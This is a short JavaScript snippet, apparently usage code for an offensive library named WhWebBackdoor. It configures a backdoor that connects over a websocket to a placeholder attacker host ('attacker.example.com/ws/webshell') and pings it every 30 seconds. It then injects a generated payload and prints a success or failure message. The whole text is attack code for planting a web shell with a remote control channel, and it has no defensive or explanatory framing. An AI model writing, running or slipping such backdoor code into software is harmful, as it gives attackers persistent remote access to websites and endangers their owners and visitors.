const backdoor = new WhWebBackdoor({
  socketUrl: 'wss://attacker.example.com/ws/webshell',
  interval: 30000  // Ping every 30 seconds
});

backdoor.inject(WhWebBackdoor.generatePayload())
  .then(success => {
    if (success) {
      console.log('[+] Backdoor injected successfully');
    } else {
      console.error('[-] Injection failed');
    }
  });